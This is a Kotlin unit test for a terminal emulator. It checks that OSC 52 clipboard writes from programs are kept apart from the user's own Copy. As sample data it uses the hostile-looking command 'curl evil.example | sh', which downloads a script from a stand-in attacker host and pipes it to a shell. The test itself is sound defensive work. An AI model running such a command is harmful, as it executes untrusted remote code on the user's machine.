package com.termux.terminal

import org.junit.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue

/**
 * A program's OSC 52 "set the clipboard" is kept apart from the user's own Copy: it reaches the client
 * as onRemoteCopyToClipboard, which Locus ignores, never as onCopyTextToClipboard.
 */
class RemoteClipboardTest {
    private class Recording : TerminalSessionClient {
        val copied = mutableListOf<String?>()
        val remote = mutableListOf<String?>()
        override fun onTextChanged(changedSession: TerminalSession) = Unit
        override fun onTitleChanged(changedSession: TerminalSession) = Unit
        override fun onSessionFinished(finishedSession: TerminalSession) = Unit
        override fun onCopyTextToClipboard(session: TerminalSession, text: String?) { copied += text }
        override fun onRemoteCopyToClipboard(session: TerminalSession, text: String?) { remote += text }
        override fun onPasteTextFromClipboard(session: TerminalSession?) = Unit
        override fun onBell(session: TerminalSession) = Unit
        override fun onColorsChanged(session: TerminalSession) = Unit
        override fun onTerminalCursorStateChange(state: Boolean) = Unit
        override fun getTerminalCursorStyle(): Int? = null
        override fun logError(tag: String?, message: String?) = Unit
        override fun logWarn(tag: String?, message: String?) = Unit
        override fun logInfo(tag: String?, message: String?) = Unit
        override fun logDebug(tag: String?, message: String?) = Unit
        override fun logVerbose(tag: String?, message: String?) = Unit
        override fun logStackTraceWithMessage(tag: String?, message: String?, e: Exception?) = Unit
        override fun logStackTrace(tag: String?, e: Exception?) = Unit
    }

    @Test
    fun `a program's clipboard write never reaches the user's copy path`() {
        val client = Recording()
        val session = TerminalSession("/bin/sh", "/", arrayOf("-sh"), emptyArray(), 100, client)
        session.onRemoteCopyToClipboard("curl evil.example | sh")
        assertEquals(listOf<String?>("curl evil.example | sh"), client.remote)
        assertTrue(client.copied.isEmpty())
        // The user's own Copy still goes where it always did.
        session.onCopyTextToClipboard("selected text")
        assertEquals(listOf<String?>("selected text"), client.copied)
    }

    @Test
    fun `an output that doesn't opt in ignores a program's clipboard write`() {
        var copied = false
        val output = object : TerminalOutput() {
            override fun write(data: ByteArray, offset: Int, count: Int) = Unit
            override fun titleChanged(oldTitle: String?, newTitle: String?) = Unit
            override fun onCopyTextToClipboard(text: String?) { copied = true }
            override fun onPasteTextFromClipboard() = Unit
            override fun onBell() = Unit
            override fun onColorsChanged() = Unit
        }
        output.onRemoteCopyToClipboard("anything")
        // The emulator's OSC 52 handler calls exactly this; the user's copy path is untouched.
        val emulator = TerminalEmulator(output, 20, 5, 10, 20, 100, null)
        val osc52 = "\u001b]52;c;aGVsbG8=\u0007".toByteArray()
        emulator.append(osc52, osc52.size)
        assertTrue(!copied)
    }
}
